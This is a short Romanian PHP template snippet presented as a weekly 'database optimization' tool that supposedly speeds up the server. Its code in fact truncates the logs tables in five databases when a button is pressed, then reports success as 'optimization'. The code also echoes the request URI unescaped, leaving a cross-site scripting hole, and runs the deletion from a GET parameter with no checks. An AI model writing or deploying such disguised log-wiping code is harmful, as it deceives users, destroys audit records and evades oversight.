<h3>Optimizare baza de date</h3>

Acesta este un tool pentru a optimiza baza de date,ca sa faceti serverul sa se miste mai bine! Asa ca va rugam sa folositi acest tool o data la o saptamana!<br><br>
{php}
$uri = $_SERVER['REQUEST_URI'];

echo "<form method='post' action='$uri&delete=logs'><input type='submit' value='Sterge'></form>"

{/php}
<br>
{php}
$uri = $_SERVER['REQUEST_URI'];

if ($_GET['delete'] == 'logs') {
mysql_query("TRUNCATE TABLE org1.logs");
mysql_query("TRUNCATE TABLE org2.logs");
mysql_query("TRUNCATE TABLE org3.logs");
mysql_query("TRUNCATE TABLE org4.logs");
mysql_query("TRUNCATE TABLE orgb.logs");
echo "Baza de date a fost optimizata cu succes! <a href='index.php?screen=delete_logs'>Inapoi !</a>";
}






{/php}